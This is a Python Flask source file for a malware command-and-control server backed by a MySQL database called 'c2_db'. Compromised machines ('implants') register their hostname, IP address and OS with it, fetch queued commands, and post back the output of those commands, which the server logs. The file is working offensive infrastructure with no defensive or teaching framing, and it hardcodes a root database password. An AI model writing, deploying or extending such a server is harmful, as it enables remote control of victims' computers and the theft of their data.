from flask import Flask, request, jsonify, render_template
import pymysql
import json

# MySQL connection details
MYSQL_HOST = 'localhost'
MYSQL_USER = 'root'
MYSQL_PASSWORD = 'jcac'
MYSQL_DB = 'c2_db'

# Connect to MySQL database
db_conn = pymysql.connect(
    host=MYSQL_HOST,
    user=MYSQL_USER,
    password=MYSQL_PASSWORD,
    db=MYSQL_DB,
)
cursor = db_conn.cursor()

app = Flask(__name__)

@app.route('/register_implant', methods=['POST'])
def register_implant():
    implant_data = request.get_json()
    print("Implant information received:")
    print(json.dumps(implant_data, indent=2))

    implant_id = implant_data.get("implant_id")
    hostname = implant_data.get("hostname")
    ip_address = implant_data.get("ip_address")
    os = implant_data.get("os")
    first_seen = implant_data.get("first_seen")
    last_seen = implant_data.get("last_seen")

    query = "INSERT INTO implants (implant_id, hostname, ip_address, os, first_seen, last_seen) VALUES (%s, %s, %s, %s, %s, %s)"
    cursor.execute(query, (implant_id, hostname, ip_address, os, first_seen, last_seen))
    db_conn.commit()
    print("Implant information registered successfully.")

    return jsonify({"status": "success"}), 200

# Checkin
@app.route('/get_command/<implant_id>', methods=['GET'])
def get_command(implant_id):
    # Check for any pending commands for the implant
    print(f"[*] Received GET request from implant {implant_id}")  # Add this line to print a message when a GET request is received

    cursor.execute("SELECT command FROM commands WHERE implant_id = %s AND status = 'pending'", (implant_id,))
    pending_commands = cursor.fetchall()

    # Update the status of the fetched commands to 'in_progress'
    cursor.execute("UPDATE commands SET status = 'in_progress' WHERE implant_id = %s AND status = 'pending'", (implant_id,))
    db_conn.commit()

    return jsonify({"commands": [command[0] for command in pending_commands]})



@app.route('/command_output', methods=['POST'])
def command_output():
    output_data = request.get_json()
    implant_id = output_data.get("implant_id")
    command = output_data.get("command")
    command_output = output_data.get("command_output")
    status = output_data.get("status")

    # Insert command output and status into the command_history table
    query = "INSERT INTO command_history (implant_id, command, command_output, status) VALUES (%s, %s, %s, %s)"
    cursor.execute(query, (implant_id, command, command_output, status))
    db_conn.commit()

    return jsonify({"status": "success"}), 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
